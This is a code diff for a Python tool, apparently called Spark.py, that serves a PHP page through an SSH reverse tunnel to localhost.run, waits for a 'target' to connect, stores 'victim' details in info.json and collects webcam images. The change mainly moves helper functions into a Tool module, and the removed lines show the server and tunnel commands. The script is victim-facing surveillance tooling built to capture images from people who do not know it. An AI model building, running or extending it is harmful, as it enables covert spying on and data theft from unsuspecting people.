@@ -1,10 +1,11 @@
+import sys ; sys.dont_write_bytecode = True
 from pathlib import Path
 from time import sleep
 import subprocess
 import linecache
 import random
+import Tool
 import json
-import sys
 import os
 
 if os.name == "nt":
@@ -36,58 +37,11 @@ else:
             exit("\nWrong package installer name or python name !")
         except KeyboardInterrupt:
             exit("\n\nUser Exited :)")
-        
-#Run localhost ====================================================================================================
-def php_server():
-    with open("Server" , "w") as log:
-        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
-#Change localhost to Server ====================================================================================================
-def loaclhost():
-    global port
-
-    with open("localhost.txt" , "w") as local:
-        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
-#Run with Sudo command ====================================================================================================
-if os.name == "posix":
-    uid = os.getuid()
-    if uid == 1000:
-        exit(f"""{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Spark.py)""")
-else:
-    pass
-#type smothly ====================================================================================================
-def Sprint(text):
-  for character in text:
-    sys.stdout.write(character)
-    sys.stdout.flush()
-    sleep(0.1)
-#smooth rotation====================================================================================================
-def rotation(text):
-    for _ in range(4):
-        print(Fore.BLUE + "[\\]" ,text ,  end= "\r")
-        sleep(0.7)
-        print(Fore.RED + "[|]" , end= "\r")
-        sleep(0.7)
-        print(Fore.CYAN + "[/]" , end= "\r")
-        sleep(0.7)
-        print(Fore.GREEN + "[-]" , end= "\r" + Fore.RESET)
-        sleep(0.7)
+        #TODO fix onix and try this again and fix tool.py               
 #Check php is installed ====================================================================================================
-
-check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)
-
-if check != 0:
-    print(f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
-    sys.exit()
-
+Tool.check_php()
 #Clear Page ====================================================================================================
-def clear():
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-
-clear()
+Tool.clear()
 sleep(0.1)
 
 #Banner ====================================================================================================
@@ -125,15 +79,15 @@ def webcam():
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
 #====================================================================================================
-    php_server()
+    Tool.php_server()
     
     sleep(1)
 
-    loaclhost()
+    Tool.loaclhost()
 
     try:
         print(" ")
-        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+        Tool.rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
@@ -145,7 +99,7 @@ def webcam():
     print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     linecache.clearcache()
 
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+    Tool.Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info ====================================================================================================
     try:
@@ -172,7 +126,7 @@ def webcam():
                     open("info.json" , "w").close()
                     victim_file.close()
 
-                    Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
+                    Tool.Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                     break
 
     except KeyboardInterrupt:
@@ -185,11 +139,11 @@ def webcam():
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
     
         if folder != 0:
-           Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
+           Tool.Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
            
            try:
             
-            Sprint(Fore.RED + "\r\n\npress ctrl + C for exit".title() + Fore.RESET)
+            Tool.Sprint(Fore.RED + "\r\n\npress ctrl + C for exit".title() + Fore.RESET)
             keyboard.wait("ctrl + c")
            except KeyboardInterrupt:
             pass
